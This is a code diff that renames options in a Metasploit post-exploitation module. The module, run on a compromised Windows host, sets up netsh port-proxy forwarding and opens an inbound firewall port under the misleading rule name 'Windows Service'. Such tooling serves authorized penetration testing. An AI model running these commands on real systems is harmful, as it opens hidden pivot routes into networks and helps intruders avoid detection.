@@ -26,10 +26,10 @@ class Metasploit3 < Msf::Post
 
 		register_options(
 			[
-				OptAddress.new('LADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),
-				OptAddress.new('CADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
-				OptInt.new(    'CPORT',    [ true, 'Port number to which to connect.']),
-				OptInt.new(    'LPORT',    [ true, 'Port number to which to listen.']),
+				OptAddress.new('LOCAL_ADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),
+				OptAddress.new('CONNECT_ADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
+				OptInt.new(    'CONNECT_PORT',    [ true, 'Port number to which to connect.']),
+				OptInt.new(    'LOCAL_PORT',    [ true, 'Port number to which to listen.']),
 				OptBool.new(   'IPV6_XP',  [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),
 				OptEnum.new(   'TYPE',     [ true, 'Type of forwarding', 'v4tov4', ['v4tov4','v6tov6','v6tov4','v4tov6']])
 			], self.class)
@@ -62,10 +62,10 @@ class Metasploit3 < Msf::Post
 		print_status("Setting PortProxy ...")
 		netsh_args = "interface portproxy "
 		netsh_args << "add #{datastore['TYPE']} "
-		netsh_args << "listenport=#{datastore['LPORT']} "
-		netsh_args << "listenaddress=#{datastore['LADDRESS']} "
-		netsh_args << "connectport=#{datastore['CPORT']} "
-		netsh_args << "connectaddress=#{datastore['CADDRESS']}"
+		netsh_args << "listenport=#{datastore['LOCAL_PORT']} "
+		netsh_args << "listenaddress=#{datastore['LOCAL_ADDRESS']} "
+		netsh_args << "connectport=#{datastore['CONNECT_PORT']} "
+		netsh_args << "connectaddress=#{datastore['CONNECT_ADDRESS']}"
 		output = cmd_exec("netsh", netsh_args)
 		if output.size > 2
 			print_error("Setup error. Verify parameters and syntax.")
@@ -113,16 +113,16 @@ class Metasploit3 < Msf::Post
 	end
 
 	def fw_enable_ports
-		print_status ("Setting port #{datastore['LPORT']} in Windows Firewall ...")
+		print_status ("Setting port #{datastore['LOCAL_PORT']} in Windows Firewall ...")
 		begin
 			if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
-				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LPORT']}\"")
+				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LOCAL_PORT']}\"")
 			else
-				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{datastore['LPORT']}\"")
+				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{datastore['LOCAL_PORT']}\"")
 			end
 			output = cmd_exec("netsh","firewall show state")
 
-			if  output =~ /^#{datastore['LPORT']} /
+			if  output =~ /^#{datastore['LOCAL_PORT']} /
 				print_good("Port opened in Windows Firewall.")
 			else
 				print_error("There was an error enabling the port.")
